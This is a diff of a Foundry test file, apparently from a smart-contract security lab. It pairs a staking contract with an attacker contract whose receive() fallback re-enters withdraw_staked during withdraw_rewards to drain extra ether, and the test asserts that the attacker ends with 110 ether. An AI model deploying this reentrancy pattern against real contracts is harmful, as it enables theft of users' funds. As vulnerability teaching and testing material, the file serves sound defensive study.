@@ -11,42 +11,41 @@ attacker withdraw staked
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
-import {staking} from "/src/reentrancy/cross-function/staking.sol";
+import {staking} from "src/reentrancy/cross-function/staking_fixed.sol";
 
-contract attacker{
+contract attacker {
     staking public target;
     bool public hasAttacked;
-    constructor(address _target){
+
+    constructor(address _target) {
         target = staking(payable(_target));
     }
 
-    function depositandrun() external{
+    function depositandrun() external {
         target.stake{value: 100 ether}();
         target.withdraw_rewards();
     }
 
-    receive() external payable{
-        if (!hasAttacked){
-            hasAttacked=true;
-            target.withdraw_staked(100e18);
+    receive() external payable {
+        if (!hasAttacked) {
+            hasAttacked = true;
+            target.withdraw_staked();
         }
-            
     }
-
 }
 
-
-contract cross_function_reentrancy is Test{
+contract cross_function_reentrancy is Test {
     staking public cf;
     attacker public exploit;
-    function setUp() external{
+
+    function setUp() external {
         cf = new staking();
-        exploit = new attacker(address(cf)) ;
+        exploit = new attacker(address(cf));
         vm.deal(address(exploit), 100 ether);
         vm.deal(address(cf), 50 ether);
     }
 
-    function test_cross_function_reentrancy() public{
+    function test_cross_function_reentrancy() public {
         (, uint256 stakedBefore, uint256 rewardsBefore, uint256 unlockBefore) = cf.users(address(exploit));
         console.log("Staked Before Attack:", stakedBefore / 1 ether, "ETH");
         console.log("Rewards Before Attack:", rewardsBefore / 1 ether, "ETH");
@@ -66,5 +65,4 @@ contract cross_function_reentrancy is Test{
         assertEq(address(exploit).balance, 110 ether);
     }
 }
-
 
